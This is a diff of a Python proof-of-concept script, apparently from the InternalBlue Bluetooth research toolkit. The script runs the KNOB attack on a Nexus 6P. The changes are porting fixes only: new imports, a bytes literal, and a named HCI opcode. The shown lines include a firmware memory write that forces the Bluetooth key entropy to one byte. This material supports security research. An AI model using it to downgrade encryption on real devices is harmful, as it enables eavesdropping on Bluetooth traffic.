@@ -3,13 +3,12 @@
 # Jiska Classen, Secure Mobile Networking Lab
 
 
-from pwn import *
 from internalblue.adbcore import ADBCore
 import internalblue.cli as cli
 import internalblue.cmds as cmd
 import internalblue.hci as hci
 from internalblue.cmds import auto_int
-
+from internalblue.utils.pwnlib_wrapper import u8, p16, u16, log
 
 """
 This is a standalone PoC for the KNOB attack on a Nexus 6P.
@@ -39,7 +38,7 @@ log.info("Installing patch which ensures that send_LMP_encryption_key_size_req i
 # this somehow crashes on the Nexus 6P, but the global variable seems to be sufficient :)
 
 # modify global variable for own setting
-internalblue.writeMem(0x204147, '\x01')  # global key entropy
+internalblue.writeMem(0x204147, b'\x01')  # global key entropy
 
 
 log.info("-----------------------KNOB-----------------------\n"
@@ -67,7 +66,7 @@ class CmdKnob(cmd.Cmd):
 
     def work(self):
         args = self.getArgs()
-        internalblue.sendHciCommand(0x1408, p16(args.hnd))
+        internalblue.sendHciCommand(hci.HCI_COMND.Encryption_Key_Size, p16(args.hnd))
         return True
 
 
